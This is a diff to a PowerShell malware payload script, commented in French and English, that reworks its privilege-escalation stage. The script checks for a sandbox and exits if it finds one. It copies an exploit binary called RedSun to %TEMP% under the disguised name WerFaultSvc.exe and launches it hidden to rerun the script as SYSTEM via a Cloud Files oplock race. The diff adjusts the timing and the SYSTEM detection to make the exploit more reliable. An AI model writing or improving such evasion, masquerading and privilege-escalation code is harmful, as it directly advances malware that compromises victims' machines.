@@ -96,33 +96,58 @@ if (Test-Sandbox) { exit }
 Start-Sleep -Milliseconds 800
 
 # ──────────────────────────────────────────────────────────────
-# 2. ÉLÉVATION DE PRIVILÈGES AVEC RedSun (LPE via Defender)
+# 2. ÉLÉVATION DE PRIVILÈGES AVEC RedSun (LPE via Cloud Files)
 #
 #    Flux :
-#    • Première exécution (compte standard) → RedSun.exe est invoqué
-#      en lui passant la ligne de commande PowerShell à exécuter en
-#      SYSTEM. RedSun élève et relance automatiquement payload.ps1.
-#    • Deuxième exécution (SYSTEM) → Test-Admin retourne $true,
-#      le payload continue vers les étapes 3-6.
+#    • Première exécution (compte standard) →
+#        1. RedSun.exe est copié dans %TEMP% (répertoire accessible en
+#           écriture) pour garantir que l'exploit peut créer ses fichiers
+#           de travail (sync-root placeholder, oplock file).
+#        2. RedSun est lancé avec la ligne de commande PS complète entre
+#           guillemets comme unique argument ; il la passe telle quelle à
+#           CreateProcessAsUserW() avec le token SYSTEM obtenu.
+#        3. Le script attend 20 s (race condition oplock) puis quitte.
+#    • Deuxième exécution (NT AUTHORITY\SYSTEM) →
+#        Test-Admin détecte SYSTEM explicitement → $true,
+#        le payload continue vers les étapes 3-6.
 # ──────────────────────────────────────────────────────────────
 
 function Test-Admin {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
+    # NT AUTHORITY\SYSTEM is treated as admin even when the Administrators
+    # group membership check returns $false for a freshly-impersonated token.
+    if ($id.Name -eq "NT AUTHORITY\SYSTEM") { return $true }
     return ([Security.Principal.WindowsPrincipal]$id).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
 if (-not (Test-Admin)) {
-    $redsunPath = Join-Path $scriptDir "RedSun.exe"
-    if (Test-Path $redsunPath) {
+    $redsunSrc = Join-Path $scriptDir "RedSun.exe"
+    if (Test-Path $redsunSrc) {
+        # Copy RedSun to %TEMP% so it runs with a writable working directory.
+        # RedSun creates its sync-root placeholder files in the current working
+        # directory; if that directory is read-only (e.g. USB root, System32)
+        # the exploit fails silently.
+        $redsunTemp = Join-Path $env:TEMP "WerFaultSvc.exe"
+        Copy-Item -Path $redsunSrc -Destination $redsunTemp -Force -EA SilentlyContinue
+        $redsunPath = if (Test-Path $redsunTemp) { $redsunTemp } else { $redsunSrc }
+
         $psExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+        # Build the full command line that RedSun will spawn as SYSTEM.
+        # Outer quotes ensure it survives as a single argv[1] token even when
+        # the script path contains spaces.
         $psArgs = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass " +
                   "-NoProfile -File `"$scriptPath`""
+        $fullCmd = "`"$psExe`" $psArgs"
+
         # Passe la commande à exécuter en SYSTEM à RedSun
         Start-Process -FilePath $redsunPath `
-                      -ArgumentList "$psExe $psArgs" `
+                      -ArgumentList $fullCmd `
+                      -WorkingDirectory $env:TEMP `
                       -WindowStyle Hidden
-        Start-Sleep -Seconds 10
+        # Wait long enough for the exploit chain to complete and relaunch the
+        # script as SYSTEM (Cloud-Files oplock race can take several seconds).
+        Start-Sleep -Seconds 20
     }
     exit
 }
